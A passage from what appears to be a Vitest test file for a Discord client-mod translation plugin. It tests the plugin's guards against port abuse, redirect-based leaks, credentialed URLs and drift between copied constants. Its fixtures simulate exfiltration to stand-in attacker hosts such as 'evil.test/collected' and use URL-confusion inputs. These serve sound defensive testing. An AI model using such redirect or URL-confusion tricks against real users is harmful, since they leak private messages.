/*
 * Vencord, a Discord client mod
 * Copyright (c) 2026 IRP_HongKong
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

/*
 * The parts of the transport guard that are NOT the hostname set.
 *
 * test/allowedHosts.test.ts pins the hostname list across the transports, and
 * test/requestShape.test.ts exercises the POST shaping in each of them against a
 * hand-written table. Three things were left unpinned by both, and each one is a
 * way the relay — which Discord's own page world can reach — could be used for
 * something other than translating:
 *
 *   port        refuse() read protocol and hostname and never the port, so an
 *               allowed hostname on port 9200 was a POST primitive against
 *               whatever answers there.
 *   redirect    all three transports fetched with the DEFAULT redirect mode and
 *               then inspected where the response had LANDED. That check was
 *               decorative: by the time res.url can be read the redirect has been
 *               followed and the request delivered, so it stopped the RESPONSE and
 *               never the exfiltration. It is not a POST-only problem either — the
 *               free gtx provider carries the message text in the QUERY STRING, so
 *               a replayed GET replays the message. Every fetch now asks for
 *               `redirect: "manual"`, and the tests below assert that the redirect
 *               target RECEIVED NOTHING rather than merely that the caller got a
 *               refusal — a status-only assertion is the same weak test that let
 *               the original defect through.
 *   normalising every transport validated `new URL(url)` and then handed the RAW
 *               string to fetch, so the string that was checked and the string
 *               that was sent were never required to be the same one.
 *
 * And the drift guard: shapeRequest() and its constants are hand-copied into four
 * files. ALLOWED_HOSTS has a drift test; the shaping did not, which is backwards,
 * because the shaping is the newer and less-reviewed of the two.
 *
 *   src/plugins/channelTranslator/native.ts   Electron main process (desktop)
 *   browser/translationHost.js                extension background (Chrome + Firefox)
 *   browser/translationBridge.ts              direct fetch (userscript, plain web)
 *   browser/content.js                        the page -> background relay
 */

import { readFileSync } from "fs";
import { join } from "path";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const ROOT = join(__dirname, "..");

const NATIVE = "src/plugins/channelTranslator/native.ts";
const HOST = "browser/translationHost.js";
const BRIDGE = "browser/translationBridge.ts";
const CONTENT = "browser/content.js";

/** The three that own a full transport: they parse the URL and they call fetch. */
const TRANSPORTS = { "native.ts": NATIVE, "translationHost.js": HOST, "translationBridge.ts": BRIDGE };

/** All four copies of the request-shaping rules, including the relay's. */
const SHAPERS = { ...TRANSPORTS, "content.js": CONTENT };

function source(relativePath: string): string {
    return readFileSync(join(ROOT, relativePath), "utf8");
}

// ---------------------------------------------------------------------------
// The shape guard's constants, pinned by source text across all four copies.
// ---------------------------------------------------------------------------

/**
 * Pull a scalar constant out of the source text.
 *
 * Source extraction rather than import, for the same reason allowedHosts.test.ts
 * does it: translationHost.js and content.js are classic scripts with no exports
 * — MV2 background.scripts and MV3 importScripts both refuse a module — so
 * reading the text is the only way to compare all four the same way.
 */
function extractConst(symbol: string, relativePath: string): string | null {
    // `.` does not match a newline, so this is anchored to the declaration's own
    // line; the greedy `.+` then runs to the LAST semicolon on it, which is what
    // keeps the `;` inside "application/json; charset=utf-8" part of the value
    // rather than the end of it.
    const m = new RegExp(`\\b${symbol}\\b[^=\\n]*=\\s*(.+);`).exec(source(relativePath));
    return m ? m[1].trim().replace(/\s+/g, " ") : null;
}

/** Pull the string entries out of an array literal. */
function extractStringArray(symbol: string, relativePath: string): string[] | null {
    const m = new RegExp(`\\b${symbol}\\b[^=]*=\\s*\\[([^\\]]*)\\]`).exec(source(relativePath));
    if (!m) return null;
    return [...m[1].matchAll(/"([^"]*)"/g)].map(x => x[1]).sort();
}

/**
 * Pull the string entries out of a `new Set([...])` declaration.
 *
 * A separate extractor from extractStringArray() above, which anchors on `= [`
 * and therefore cannot see a Set literal — the host sets in these files are all
 * `new Set([...])`. Getting that wrong is silent: the array extractor simply
 * returns null, which is why the callers below assert non-null before comparing,
 * and why this one has its own negative control.
 */
function extractHostSet(symbol: string, relativePath: string): string[] | null {
    const m = new RegExp(`\\b${symbol}\\b[^=]*=\\s*new Set\\(\\[([^\\]]*)\\]`).exec(source(relativePath));
    if (!m) return null;
    return [...m[1].matchAll(/"([^"]*)"/g)].map(x => x[1]).sort();
}

describe("request shape guard — constants are identical in every copy", () => {
    describe("extraction", () => {
        it("finds MAX_BODY_CHARS in all four copies (positive control)", () => {
            for (const [label, path] of Object.entries(SHAPERS)) {
                expect(extractConst("MAX_BODY_CHARS", path), label).not.toBeNull();
            }
        });

        it("finds INIT_KEYS in the three transports (positive control)", () => {
            for (const [label, path] of Object.entries(TRANSPORTS)) {
                expect(extractStringArray("INIT_KEYS", path), label).not.toBeNull();
            }
        });

        it("returns nothing for a symbol that is absent (negative control)", () => {
            // Without this, an extractor that silently matched nothing would make
            // every comparison below pass vacuously — which is exactly how a
            // drift test comes to be worth nothing.
            expect(extractConst("NOT_A_REAL_SYMBOL", NATIVE)).toBeNull();
            expect(extractStringArray("NOT_A_REAL_SYMBOL", NATIVE)).toBeNull();
        });
    });

    it("MAX_BODY_CHARS is spelled the same in all four", () => {
        // Not merely equal in value: equal as written. The cap is compared against
        // String.length on both sides of the relay, and content.js re-checks it
        // before the message leaves the page's world, so the two halves have to
        // agree about the same number for the same reason.
        for (const [label, path] of Object.entries(SHAPERS)) {
            expect(extractConst("MAX_BODY_CHARS", path), label).toBe("1024 * 1024");
        }
    });

    it("JSON_CONTENT_TYPE is identical in the three transports", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractConst("JSON_CONTENT_TYPE", path), label)
                .toBe('"application/json; charset=utf-8"');
        }
    });

    it("INIT_KEYS names the same two keys in the three transports", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractStringArray("INIT_KEYS", path), label).toEqual(["body", "method"]);
        }
    });

    it("content.js's relay refuses every key outside INIT_KEYS", () => {
        // content.js has no INIT_KEYS array — it names the keys inline, because it
        // rebuilds the object rather than filtering it. That is the copy most
        // likely to drift, so the inline names are extracted and compared to the
        // array the transports use.
        const relayKeys = [...source(CONTENT).matchAll(/key !== "([^"]+)"/g)].map(m => m[1]).sort();
        expect(relayKeys).toEqual(extractStringArray("INIT_KEYS", NATIVE));
    });

    it("content.js rebuilds the options rather than forwarding the page's object", () => {
        // Pinned by source rather than by behaviour because no behavioural test
        // CAN see it: shapeInit() already refuses an unknown key, so forwarding
        // the page's object and rebuilding it are indistinguishable — right up
        // until the day the key check is loosened, which is the day it matters.
        // A guard whose failure is currently invisible is precisely the one that
        // gets deleted as redundant.
        expect(source(CONTENT)).toContain("init: { method: init.method, body: init.body }");
    });

    it("the userinfo refusal is spelled the same in the three transports", () => {
        // The newest rule in checkUrl(), and hand-copied like all the others, so it
        // is pinned the same way. Both halves are named because they are set
        // independently — "https://user@h/" leaves password empty and
        // "https://:pass@h/" leaves username empty — and a copy that checked only
        // `username` would look right and admit the second one.
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            const text = source(path);
            expect(text.includes('target.username !== "" || target.password !== ""'), label).toBe(true);
            expect(text.includes("must not carry embedded credentials"), label).toBe(true);
        }
    });

    it("content.js deliberately holds no URL guard of its own", () => {
        // Not an omission: the relay runs in a world the page can already reach, so
        // a URL check here would be advice rather than a control — the same reason
        // it holds no ALLOWED_HOSTS. Pinned so that "content.js is missing the
        // credential rule" is answered by this test rather than by somebody adding
        // a fourth copy that then drifts.
        const text = source(CONTENT);
        expect(text.includes("target.username")).toBe(false);
        expect(text.includes("ALLOWED_HOSTS")).toBe(false);
        expect(text.includes("new URL(")).toBe(false);
    });

    it("the method union is exactly GET and POST in all four", () => {
        // The union is a pair of literal comparisons rather than a constant, in
        // every copy. Anything that adds a third verb, or relaxes the comparison,
        // stops matching this.
        for (const [label, path] of Object.entries(SHAPERS)) {
            const text = source(path);
            expect(/method !== "GET" && method !== "POST"/.test(text), label).toBe(true);
            // A case-insensitive compare would admit "post" from the page and is
            // the obvious "helpful" edit somebody makes at 2am.
            expect(/toUpperCase\(\)|toLowerCase\(\)/i.test(text.slice(
                text.indexOf("method"), text.indexOf("method") + 2000
            )), label).toBe(false);
        }
    });
});

// ---------------------------------------------------------------------------
// Behavioural drift: all four copies must make the SAME decision, input by input.
// ---------------------------------------------------------------------------

const ALLOWED = "https://translation.googleapis.com/language/translate/v2?key=k";
const BODY = JSON.stringify({ q: "hello", target: "es", format: "text" });
const OVERSIZED = "x".repeat(1024 * 1024 + 1);

function okResponse(url: string = ALLOWED) {
    return {
        url,
        status: 200,
        text: async () => "ok",
        headers: { get: () => null }
    };
}

/** A sentinel meaning "do not put this key on the object at all". */
const ABSENT = Symbol("absent");

const METHOD_VALUES: unknown[] = [
    ABSENT, undefined, "GET", "POST", "post", "get", "Post", "PUT", "DELETE",
    "HEAD", "OPTIONS", "PATCH", "", null, 0, 1, ["POST"], { toString: () => "POST" }
];

const BODY_VALUES: unknown[] = [
    ABSENT, undefined, "", BODY, "x".repeat(1024 * 1024), OVERSIZED, 42, null,
    { q: "hello" }, ["body"], true
];

const EXTRA_KEYS: (Record<string, unknown> | null)[] = [
    null,
    { headers: { Authorization: "Bearer x" } },
    { credentials: "include" },
    { cache: "no-store" },
    { redirect: "manual" },
    { integrity: "" }
];

/** Every init object the four copies are compared on. */
function buildCases(): { label: string; init: unknown; }[] {
    const cases: { label: string; init: unknown; }[] = [
        { label: "init: undefined", init: undefined },
        { label: "init: null", init: null },
        { label: "init: a string", init: "POST" },
        { label: "init: a number", init: 7 },
        { label: "init: an array", init: [{ method: "POST", body: BODY }] },
        { label: "init: an empty array", init: [] }
    ];

    for (const method of METHOD_VALUES) {
        for (const body of BODY_VALUES) {
            for (const extra of EXTRA_KEYS) {
                const init: Record<string, unknown> = {};
                if (method !== ABSENT) init.method = method;
                if (body !== ABSENT) init.body = body;
                if (extra) Object.assign(init, extra);

                const show = (v: unknown) =>
                    v === ABSENT ? "-" : typeof v === "string"
                        ? (v.length > 24 ? `str(${v.length})` : JSON.stringify(v))
                        : String(JSON.stringify(v));

                cases.push({
                    label: `method=${show(method)} body=${show(body)} extra=${extra ? Object.keys(extra)[0] : "-"}`,
                    init
                });
            }
        }
    }

    return cases;
}

const CASES = buildCases();

describe("request shape guard — the four copies agree, input by input", () => {
    let hostListener: (m: any, s: any, respond: (r: any) => void) => unknown;
    let relayListener: (event: any) => void;
    let relaySent: any[];

    beforeEach(async () => {
        vi.resetModules();
        vi.stubGlobal("IS_EXTENSION", false);
        vi.stubGlobal("fetch", vi.fn(async (u: string) => okResponse(u)));

        vi.stubGlobal("chrome", {
            runtime: {
                lastError: undefined,
                onMessage: { addListener: (l: any) => { hostListener = l; } },
                sendMessage: (message: any, cb: (r: any) => void) => {
                    relaySent.push(message);
                    cb({ status: 200, body: "ok" });
                },
                getManifest: () => ({ version: "0.0.0" }),
                getURL: (p: string) => `chrome-extension://x/${p}`
            }
        });

        relaySent = [];
        vi.stubGlobal("window", {
            addEventListener: (type: string, fn: any) => { if (type === "message") relayListener = fn; },
            postMessage: () => { },
            location: { origin: "https://discord.com" }
        });
        vi.stubGlobal("document", { addEventListener: () => { } });

        await import("../browser/translationHost.js");
        await import("../browser/content.js");
    });

    afterEach(() => vi.unstubAllGlobals());

    /** @returns true if this copy would let the request out, false if it refused. */
    async function accepts(which: keyof typeof SHAPERS, init: unknown): Promise<boolean> {
        if (which === "native.ts") {
            const { fetchTranslation } = await import("../src/plugins/channelTranslator/native");
            const res = await fetchTranslation({} as any, ALLOWED, init as any);
            return res.status === 200;
        }

        if (which === "translationHost.js") {
            const res = await new Promise<any>(resolve => {
                hostListener({ action: "discordTranslator:fetch", url: ALLOWED, init }, null, resolve);
            });
            return res.status === 200;
        }

        if (which === "translationBridge.ts") {
            const { ChannelTranslatorHelper } = await import("../browser/translationBridge");
            const res = await ChannelTranslatorHelper.fetchTranslation(ALLOWED, init as any);
            return res.status === 200;
        }

        // content.js does not fetch; letting the request out means handing it to
        // the background at all.
        relaySent = [];
        relayListener({
            source: (globalThis as any).window,
            data: { type: "discordTranslator:fetch", id: 1, url: ALLOWED, init }
        });
        return relaySent.length === 1;
    }

    it("makes the same accept/refuse decision in native.ts, translationHost.js, translationBridge.ts and content.js", async () => {
        const disagreements: string[] = [];
        let accepted = 0;
        let refused = 0;

        for (const { label, init } of CASES) {
            const verdicts: Record<string, boolean> = {};
            for (const which of Object.keys(SHAPERS) as (keyof typeof SHAPERS)[]) {
                verdicts[which] = await accepts(which, init);
            }

            const values = Object.values(verdicts);
            if (values.some(v => v !== values[0])) {
                disagreements.push(`${label} -> ${JSON.stringify(verdicts)}`);
            } else if (values[0]) accepted++;
            else refused++;
        }

        expect(disagreements.slice(0, 10)).toEqual([]);
        expect(disagreements).toHaveLength(0);

        // Positive and negative controls on the table itself. A generator that
        // produced only refusable inputs — or only acceptable ones — would agree
        // across all four copies while testing nothing.
        expect(accepted, "the table must contain requests every copy accepts").toBeGreaterThan(0);
        expect(refused, "the table must contain requests every copy refuses").toBeGreaterThan(0);
        expect(accepted + refused).toBe(CASES.length);
    });
});

// ---------------------------------------------------------------------------
// Per-transport behaviour: port, redirect, and normalised URL.
// ---------------------------------------------------------------------------

/**
 * A URL whose raw text and whose normalised href are DIFFERENT strings, so that
 * "which one reached fetch" is an observable fact rather than a coincidence.
 * Google's own provider builds query strings with encodeURIComponent, which
 * leaves an apostrophe alone; the URL parser percent-encodes it.
 */
const RAW_URL = "https://translation.googleapis.com/language/translate/v2?key=k&q=it's";
const NORMALISED_URL = "https://translation.googleapis.com/language/translate/v2?key=k&q=it%27s";

const NON_DEFAULT_PORT = "https://translation.googleapis.com:8080/language/translate/v2";
const EXPLICIT_443 = "https://translation.googleapis.com:443/language/translate/v2";

it("the URL fixtures are what this file claims they are (control)", () => {
    // If RAW_URL and NORMALISED_URL were ever the same string, every "sends the
    // normalised href" assertion below would pass without proving anything.
    expect(RAW_URL).not.toBe(NORMALISED_URL);
    expect(new URL(RAW_URL).href).toBe(NORMALISED_URL);
    // And :443 really does normalise away, which is what makes "port must be the
    // empty string" a rule about the port rather than about the text.
    expect(new URL(EXPLICIT_443).port).toBe("");
    expect(new URL(NON_DEFAULT_PORT).port).toBe("8080");
});

describe("native.ts (desktop main process)", () => {
    afterEach(() => vi.unstubAllGlobals());

    async function ask(url: string, init?: unknown) {
        const { fetchTranslation } = await import("../src/plugins/channelTranslator/native");
        return fetchTranslation({} as any, url, init as any);
    }

    it("refuses an allowed host on a non-default port", async () => {
        vi.stubGlobal("fetch", vi.fn(() => { throw new Error("must not be reached"); }));

        const res = await ask(NON_DEFAULT_PORT, { method: "POST", body: BODY });
        expect(res.status).toBe(0);
        expect(res.body).toMatch(/^blocked:/);
        expect(res.body).toContain("8080");
    });

    it("still allows the same host with an explicit :443", async () => {
        const fetchMock = vi.fn(async (u: string) => okResponse(u));
        vi.stubGlobal("fetch", fetchMock);

        const res = await ask(EXPLICIT_443);
        expect(res.status).toBe(200);
    });

    it("sends the normalised href, not the raw string it was given", async () => {
        const fetchMock = vi.fn(async () => okResponse(NORMALISED_URL));
        vi.stubGlobal("fetch", fetchMock);

        await ask(RAW_URL, { method: "POST", body: BODY });
        expect(fetchMock.mock.calls[0][0]).toBe(NORMALISED_URL);
    });

    it("refuses a redirect that landed off the allow-list", async () => {
        // Node's fetch follows redirects by default and a 307 REPLAYS the POST
        // body, which is the message text.
        vi.stubGlobal("fetch", vi.fn(async () => okResponse("https://evil.test/collected")));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.status).toBe(0);
        expect(res.body).toMatch(/^blocked response origin:/);
    });

    it("refuses a redirect that landed on an allowed host on another port", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => okResponse(NON_DEFAULT_PORT)));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.body).toMatch(/^blocked response origin:/);
    });

    it("refuses when the response will not say where it landed", async () => {
        // Fail closed: a response whose origin cannot be established is precisely
        // the case the re-check exists for. Spelled as a literal rather than
        // okResponse(undefined), because that would take the default parameter
        // and quietly test the allowed case instead.
        vi.stubGlobal("fetch", vi.fn(async () => ({
            status: 200,
            text: async () => "ok",
            headers: { get: () => null }
        })));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.body).toBe("blocked response origin: malformed URL");
    });

    it("returns the body when the redirect stayed on the allow-list", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => okResponse("https://api.deepl.com/v2/translate")));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.status).toBe(200);
        expect(res.body).toBe("ok");
    });
});

describe("translationHost.js (extension background)", () => {
    let listener: (m: any, s: any, respond: (r: any) => void) => unknown;

    beforeEach(async () => {
        vi.resetModules();
        vi.stubGlobal("chrome", {
            runtime: { onMessage: { addListener: (l: any) => { listener = l; } } }
        });
        await import("../browser/translationHost.js");
    });

    afterEach(() => vi.unstubAllGlobals());

    function ask(url: string, init?: unknown) {
        return new Promise<any>(resolve => {
            listener({ action: "discordTranslator:fetch", url, init }, null, resolve);
        });
    }

    it("refuses an allowed host on a non-default port", async () => {
        vi.stubGlobal("fetch", vi.fn(() => { throw new Error("must not be reached"); }));

        const res = await ask(NON_DEFAULT_PORT, { method: "POST", body: BODY });
        expect(res.status).toBe(0);
        expect(res.body).toMatch(/^blocked:/);
        expect(res.body).toContain("8080");
    });

    it("still allows the same host with an explicit :443", async () => {
        vi.stubGlobal("fetch", vi.fn(async (u: string) => okResponse(u)));

        const res = await ask(EXPLICIT_443);
        expect(res.status).toBe(200);
    });

    it("sends the normalised href, not the raw string it was given", async () => {
        const fetchMock = vi.fn(async () => okResponse(NORMALISED_URL));
        vi.stubGlobal("fetch", fetchMock);

        await ask(RAW_URL, { method: "POST", body: BODY });
        expect(fetchMock.mock.calls[0][0]).toBe(NORMALISED_URL);
    });

    it("refuses a redirect that landed on an allowed host on another port", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => okResponse(NON_DEFAULT_PORT)));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.body).toMatch(/^blocked response origin:/);
    });
});

describe("translationBridge.ts (userscript and plain web)", () => {
    beforeEach(() => {
        vi.resetModules();
        // The direct path is the one that carries the guard; the extension path
        // delegates to translationHost.js, covered above.
        vi.stubGlobal("IS_EXTENSION", false);
    });

    afterEach(() => vi.unstubAllGlobals());

    async function ask(url: string, init?: unknown) {
        const { ChannelTranslatorHelper } = await import("../browser/translationBridge");
        return ChannelTranslatorHelper.fetchTranslation(url, init as any);
    }

    it("refuses an allowed host on a non-default port", async () => {
        vi.stubGlobal("fetch", vi.fn(() => { throw new Error("must not be reached"); }));

        const res = await ask(NON_DEFAULT_PORT, { method: "POST", body: BODY });
        expect(res.status).toBe(0);
        expect(res.body).toMatch(/^blocked:/);
        expect(res.body).toContain("8080");
    });

    it("still allows the same host with an explicit :443", async () => {
        vi.stubGlobal("fetch", vi.fn(async (u: string) => okResponse(u)));

        const res = await ask(EXPLICIT_443);
        expect(res.status).toBe(200);
    });

    it("sends the normalised href, not the raw string it was given", async () => {
        const fetchMock = vi.fn(async () => okResponse(NORMALISED_URL));
        vi.stubGlobal("fetch", fetchMock);

        await ask(RAW_URL, { method: "POST", body: BODY });
        expect(fetchMock.mock.calls[0][0]).toBe(NORMALISED_URL);
    });

    it("refuses a redirect that landed off the allow-list", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => okResponse("https://evil.test/collected")));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.status).toBe(0);
        expect(res.body).toMatch(/^blocked response origin:/);
    });

    it("refuses a redirect that landed on an allowed host on another port", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => okResponse(NON_DEFAULT_PORT)));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.body).toMatch(/^blocked response origin:/);
    });

    it("reads GM_fetch's finalUrl, which is where the userscript build lands", async () => {
        // GMPolyfill resolves the raw GM_xmlhttpRequest response. It has no `url`
        // — the final URL is `finalUrl` — so a check that only knew `url` would
        // refuse every userscript translation.
        vi.stubGlobal("fetch", vi.fn(async () => ({
            status: 200,
            finalUrl: ALLOWED,
            text: async () => "ok",
            headers: { get: () => null }
        })));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.status).toBe(200);
        expect(res.body).toBe("ok");
    });

    it("still refuses when finalUrl is where it went wrong", async () => {
        vi.stubGlobal("fetch", vi.fn(async () => ({
            status: 200,
            finalUrl: "https://evil.test/collected",
            text: async () => "ok",
            headers: { get: () => null }
        })));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.status).toBe(0);
        expect(res.body).toMatch(/^blocked response origin:/);
    });

    it("refuses when the response names no final URL at all", async () => {
        // Fail closed. A response that will not say where it came from is the
        // case this check exists for, and the alternative — trusting it — would
        // reinstate the hole on exactly the path that cannot be re-checked.
        vi.stubGlobal("fetch", vi.fn(async () => ({
            status: 200,
            text: async () => "ok",
            headers: { get: () => null }
        })));

        const res = await ask(ALLOWED, { method: "POST", body: BODY });
        expect(res.body).toBe("blocked response origin: malformed URL");
    });
});

// ---------------------------------------------------------------------------
// URL userinfo: an allowed hostname reached with credentials in the URL.
// ---------------------------------------------------------------------------

/*
 * `new URL("https://user:pass@translation.googleapis.com/x")` has
 * hostname === "translation.googleapis.com" and port === "", so the host and port
 * tests both accept it, and `.href` KEEPS the credentials — passing the normalised
 * href to fetch does not strip them. The request failed anyway, but it failed in
 * fetch(), which refuses "a URL that includes credentials": the runtime was closing
 * the hole and nothing here pinned that. These tests pin it in our own code, on the
 * outbound URL and on the URL that answered.
 */
const CREDENTIALED = "https://user:pass@translation.googleapis.com/language/translate/v2?key=k";
const USER_ONLY = "https://user@translation.googleapis.com/language/translate/v2?key=k";
const PASSWORD_ONLY = "https://:pass@translation.googleapis.com/language/translate/v2?key=k";
const EMPTY_USERINFO = "https://@translation.googleapis.com/language/translate/v2?key=k";
/** The classic misread: the allowed name is the USERNAME here, and the host is evil.test. */
const HOST_AFTER_AT = "https://translation.googleapis.com@evil.test/x";

const CREDENTIAL_REFUSAL = "a translation URL must not carry embedded credentials";

it("the credentialed fixtures are refusable ONLY by the new rule (control)", () => {
    // Without this, every "refuses a credentialed URL" assertion below could be
    // passing because the HOST check refused it, and would keep passing with the
    // userinfo rule deleted. Each of these three parses to an allowed hostname on
    // the default port over https — so nothing else in checkUrl() can refuse them.
    for (const url of [CREDENTIALED, USER_ONLY, PASSWORD_ONLY]) {
        const u = new URL(url);
        expect(u.protocol, url).toBe("https:");
        expect(u.port, url).toBe("");
        expect(u.hostname, url).toBe("translation.googleapis.com");
        expect(u.username !== "" || u.password !== "", url).toBe(true);
    }

    // And the two that must NOT be refused by it: an empty userinfo is dropped by
    // the parser, so it is not credentials at all...
    expect(new URL(EMPTY_USERINFO).username).toBe("");
    expect(new URL(EMPTY_USERINFO).password).toBe("");
    expect(new URL(EMPTY_USERINFO).href).toBe(ALLOWED);

    // ...and this one is a HOST problem, not a credential problem, which is why the
    // userinfo test is placed after the host test rather than before it.
    expect(new URL(HOST_AFTER_AT).hostname).toBe("evil.test");
});

describe("URL guard — the three transports agree, URL by URL", () => {
    let hostListener: (m: any, s: any, respond: (r: any) => void) => unknown;

    beforeEach(async () => {
        vi.resetModules();
        vi.stubGlobal("IS_EXTENSION", false);
        vi.stubGlobal("fetch", vi.fn(async (u: string) => okResponse(u)));
        vi.stubGlobal("chrome", {
            runtime: { onMessage: { addListener: (l: any) => { hostListener = l; } } }
        });
        await import("../browser/translationHost.js");
    });

    afterEach(() => vi.unstubAllGlobals());

    async function ask(which: keyof typeof TRANSPORTS, url: string): Promise<any> {
        if (which === "native.ts") {
            const { fetchTranslation } = await import("../src/plugins/channelTranslator/native");
            return fetchTranslation({} as any, url);
        }
        if (which === "translationHost.js") {
            return new Promise<any>(resolve => {
                hostListener({ action: "discordTranslator:fetch", url }, null, resolve);
            });
        }
        const { ChannelTranslatorHelper } = await import("../browser/translationBridge");
        return ChannelTranslatorHelper.fetchTranslation(url);
    }

    const URL_CASES: [string, string, boolean][] = [
        ["no userinfo", ALLOWED, true],
        ["an empty userinfo, which the parser drops", EMPTY_USERINFO, true],
        ["a username and a password", CREDENTIALED, false],
        ["a username alone", USER_ONLY, false],
        ["a password alone", PASSWORD_ONLY, false],
        ["a percent-encoded @ inside the username", "https://user%40x:pass@translation.googleapis.com/x", false],
        ["the allowed name used as the username", HOST_AFTER_AT, false]
    ];

    it.each(URL_CASES)("all three make the same decision about %s", async (_label, url, allowed) => {
        const verdicts: Record<string, boolean> = {};
        for (const which of Object.keys(TRANSPORTS) as (keyof typeof TRANSPORTS)[]) {
            verdicts[which] = (await ask(which, url)).status === 200;
        }
        expect(verdicts).toEqual({
            "native.ts": allowed,
            "translationHost.js": allowed,
            "translationBridge.ts": allowed
        });
    });

    it("the table contains both accepted and refused URLs (control)", () => {
        // A table of only-refusable URLs would agree across all three copies while
        // proving nothing, which is how a drift test comes to be worth nothing.
        expect(URL_CASES.some(c => c[2])).toBe(true);
        expect(URL_CASES.some(c => !c[2])).toBe(true);
    });

    it.each(Object.keys(TRANSPORTS))("%s names the credential rule in its refusal", async which => {
        const res = await ask(which as keyof typeof TRANSPORTS, CREDENTIALED);
        expect(res.status).toBe(0);
        expect(res.body).toBe(`blocked: ${CREDENTIAL_REFUSAL}`);
        // The credentials themselves must never be echoed: the reason is returned
        // to the caller and written to the console.
        expect(res.body).not.toContain("pass");
        expect(res.body).not.toContain("user");
    });

    it.each(Object.keys(TRANSPORTS))("%s refuses a redirect that LANDED on a credentialed URL", async which => {
        // checkUrl() is applied twice, so the rule has to hold on the URL that
        // answered as well. A 307 from an allowed host replays the POST body — the
        // user's message text — and this is the check that sees where it went.
        vi.stubGlobal("fetch", vi.fn(async () => okResponse(CREDENTIALED)));

        const res = await ask(which as keyof typeof TRANSPORTS, ALLOWED);
        expect(res.status).toBe(0);
        expect(res.body).toBe(`blocked response origin: ${CREDENTIAL_REFUSAL}`);
    });
});

// ---------------------------------------------------------------------------
// Redirects: the request must not be DELIVERED, not merely refused afterwards.
// ---------------------------------------------------------------------------

/*
 * The original guard fetched with the default redirect mode and then read res.url.
 * Every test it had asserted the returned STATUS, and every one of them passed
 * while the user's message was already sitting on the attacker's server — because
 * a followed redirect delivers the request before res.url exists to be read.
 *
 * So the assertions here are about the TARGET, not about the caller. A refusal
 * that arrives after delivery is not a refusal, and a test that cannot tell the
 * two apart is the test that let this through.
 */

/** Stands in for the user's message text, so a leak is visible as itself. */
const SECRET = "USERS_PRIVATE_DISCORD_MESSAGE";
const SECRET_BODY = JSON.stringify({ q: SECRET, target: "es", format: "text" });
/** The gtx shape: the message travels in the QUERY STRING, not in a body. */
const SECRET_GET_URL =
    "https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=es&dt=t&dj=1&q="
    + encodeURIComponent(SECRET);

const REDIRECT_REFUSAL = "refused to follow a redirect away from the translation host";
const REDIRECT_REPLAY_REFUSAL = "refused a 307 or 308 redirect, which would replay the request body";
const REDIRECT_OPAQUE_REFUSAL = "refused a redirect this runtime will not describe";
const REDIRECT_HOP_REFUSAL = "refused a second redirect from a redirect target";
const ATTACKER = "https://evil.test/collect";

it("every redirect refusal is spelled identically in all three transports", () => {
    // Hand-copied like every other constant in these files, and pinned the same
    // way. A copy that drifted would still refuse, but the assertions below that
    // compare against these exact strings would then be testing one transport's
    // wording rather than the rule.
    const REFUSALS = {
        REDIRECT_REFUSAL,
        REDIRECT_REPLAY_REFUSAL,
        REDIRECT_OPAQUE_REFUSAL,
        REDIRECT_HOP_REFUSAL
    };

    for (const [symbol, value] of Object.entries(REFUSALS)) {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractConst(symbol, path), `${symbol} in ${label}`).toBe(`"${value}"`);
        }
    }
});

it("the four refusals are four DIFFERENT strings (control)", () => {
    // They are asserted against each other below — "307 says replay, 302-to-evil
    // says away-from-the-host" — and that comparison is worth nothing if two of
    // them happen to be the same text.
    const all = [REDIRECT_REFUSAL, REDIRECT_REPLAY_REFUSAL, REDIRECT_OPAQUE_REFUSAL, REDIRECT_HOP_REFUSAL];
    expect(new Set(all).size).toBe(all.length);
});

/** Pull the numeric entries out of an array literal, for the two status tables. */
function extractNumberArray(symbol: string, relativePath: string): number[] | null {
    const m = new RegExp(`\\b${symbol}\\b[^=]*=\\s*\\[([^\\]]*)\\]`).exec(source(relativePath));
    if (!m) return null;
    return [...m[1].matchAll(/\d+/g)].map(x => Number(x[0])).sort();
}

describe("the 3xx split is the same in all three transports", () => {
    it("finds both tables in every transport (positive control)", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractNumberArray("BODY_REPLAYING_REDIRECTS", path), label).not.toBeNull();
            expect(extractNumberArray("GET_REISSUING_REDIRECTS", path), label).not.toBeNull();
        }
        // Same negative control the other extractors carry: an extractor that
        // silently matched nothing would make every comparison here vacuous.
        expect(extractNumberArray("NOT_A_REAL_SYMBOL", NATIVE)).toBeNull();
    });

    it("names 307 and 308 as the body-replaying statuses, everywhere", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractNumberArray("BODY_REPLAYING_REDIRECTS", path), label).toEqual([307, 308]);
        }
    });

    it("names 301, 302 and 303 as the GET-reissuing statuses, everywhere", () => {
        for (const [label, path] of Object.entries(TRANSPORTS)) {
            expect(extractNumberArray("GET_REISSUING_REDIRECTS", path), label).toEqual([301, 302, 303]);
        }
    });

    it("the two tables do not overlap (control)", () => {
        // A status in both would be followed by whichever test ran first, which is
        // exactly the confusion the split exists to prevent.
        const replay = extractNumberArray("BODY_REPLAYING_REDIRECTS", NATIVE)!;
        const reissue = extractNumberArray("GET_REISSUING_REDIRECTS", NATIVE)!;
        expect(replay.filter(s => reissue.includes(s))).toEqual([]);
    });
});

/**
 * A fetch that behaves the way a real one does about redirects, so "was the
 * request delivered?" is an observable fact rather than an assumption.
 *
